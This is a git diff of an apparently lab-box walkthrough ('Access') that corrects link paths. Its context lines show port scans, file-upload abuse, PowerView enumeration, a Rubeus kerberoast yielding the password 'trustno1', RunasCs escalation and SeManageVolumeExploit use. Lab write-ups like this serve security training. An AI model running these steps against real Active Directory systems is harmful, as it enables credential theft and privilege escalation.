@@ -2,7 +2,7 @@
 ## Reconnaissance
 ### All port scanning
 #### TCP Ports
-- `nmap -p- -T4 -sS -min-rate 1000 192.168.225.187`<br>![Scan](/1.Access//images/All_port_scan.png)
+- `nmap -p- -T4 -sS -min-rate 1000 192.168.225.187`<br>![Scan](/1.Access/images/All_port_scan.png)
 - `nmap -A -p 53,80,88,135,139,389,443,445,464,593,636,3268,3269,5985,9389,47001 192.168.225.187`
 
     ```
@@ -88,7 +88,7 @@
 - We have found the domain name for the webpage let's do the hostname resolution in `/etc/hosts` file.
 - Now, we can get access to website with url - `http://example.com/`
 - Buy ticket feature in the website can give us file upload vulnerability ![File_upload](/1.Access//images/file_upload.png)
-- By viewing page source we have also found the theme which was used to make this website so by follwoing this link we can also download the theme and understand it's file structure ![file_structure](/1.Access//images/Themes.png)
+- By viewing page source we have also found the theme which was used to make this website so by follwoing this link we can also download the theme and understand it's file structure ![file_structure](/1.Access/images/Themes.png)
 #### Sub-directory enumeration
 - `gobuster dir -u http://192.168.225.187 -w /usr/share/wordlists/dirb/common.txt`
 
@@ -164,7 +164,7 @@ svc_apache               svc_mssql
 The command completed successfully.
 ```
 
-- We will also upload [PowerView.ps1](/1.Access/PowerView.ps1) to know about the target
+- We will also upload [PowerView.ps1](/1.Access/Sources/PowerView.ps1) to know about the target
 
 ```pwsh
 PS C:\xampp\htdocs\uploads> Get-netuser svc_mssql
@@ -205,7 +205,7 @@ usnchanged                    : 73754
 ```
 
 - We can see that this account is configured with a **`serviceprincipalname`** or `SPN`. Armed with this information, we can perform a kerberoasting attack.
-- We will download and run [Rubeus.exe](/1.Access/Rubeus.exe)
+- We will download and run [Rubeus.exe](/1.Access/Sources/Rubeus.exe)
 i got
 ```pwsh
 PS C:\xampp\htdocs\uploads> ./Rubeus.exe kerberoast /nowrap
@@ -242,7 +242,7 @@ PS C:\xampp\htdocs\uploads> ./Rubeus.exe kerberoast /nowrap
 
 - Let's copy the hash and save in out kali system as `mssql.hash` then try to decrypt it using hashcat.
 - We got the password as `trustno1`.
-- Now we will privelage escalate to `svc_mssql` using [Invoke-RunAsCs](/1.Access/PowerView.ps1)
+- Now we will privelage escalate to `svc_mssql` using [Invoke-RunAsCs](/1.Access/Sources/PowerView.ps1)
     ```pwsh
     PS C:\xampp\htdocs\uploads> import-module ./Invoke-RunasCs.ps1
     import-module ./Invoke-RunasCs.ps1
@@ -282,7 +282,7 @@ SeIncreaseWorkingSetPrivilege Increase a process working set   Disabled
 PS C:\users\svc_mssql\Desktop>
 ```
 
-- We will use  [SeManageVolumeExploit.exe](/1.Access/SeManageVolumeExploit.exe) to exploit the Hard-disk of the target.
+- We will use  [SeManageVolumeExploit.exe](/1.Access/Sources/SeManageVolumeExploit.exe) to exploit the Hard-disk of the target.
 ```pwsh
 PS C:\xampp\htdocs\uploads> ./SeManageVolumeExploit.exe
 ./SeManageVolumeExploit.exe
